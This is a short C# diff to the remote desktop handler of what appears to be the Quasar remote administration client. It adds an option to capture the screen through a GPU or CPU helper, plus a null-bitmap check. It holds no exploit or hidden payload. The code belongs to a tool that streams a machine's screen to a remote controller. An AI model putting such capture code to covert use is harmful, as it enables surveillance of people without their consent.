@@ -13,6 +13,7 @@ using System.Threading;
 using System.Diagnostics;
 using Quasar.Common.Messages.Monitoring.RemoteDesktop;
 using Quasar.Common.Messages.other;
+using Quasar.Client.Helper.ScreenStuff;
 
 namespace Quasar.Client.Messages
 {
@@ -25,6 +26,8 @@ namespace Quasar.Client.Messages
         private ISender _clientMain;
         private Thread _sendFramesThread;
         private CancellationTokenSource _cancellationTokenSource;
+
+        private bool _useGpu = false;
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
@@ -71,7 +74,9 @@ namespace Quasar.Client.Messages
         {
             Debug.WriteLine("Starting remote desktop session");
 
-            var monitorBounds = ScreenHelper.GetBounds(message.DisplayIndex);
+            _useGpu = message.UseGPU;
+
+            var monitorBounds = ScreenHelperGPU.GetBounds(message.DisplayIndex);
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (_streamCodec == null)
@@ -150,7 +155,22 @@ namespace Quasar.Client.Messages
         {
             try
             {
-                _desktop = ScreenHelper.CaptureScreen(_displayIndex);
+                if (_useGpu)
+                {
+                    _desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
+                }
+                else
+                {
+                    _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
+                }
+                //_desktop = ScreenHelperGPU.CaptureScreen(_displayIndex);
+
+                if (_desktop == null)
+                {
+                    Debug.WriteLine("Error capturing screen: Bitmap is null");
+                    return;
+                }
+
                 _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
                     ImageLockMode.ReadWrite, _desktop.PixelFormat);
 
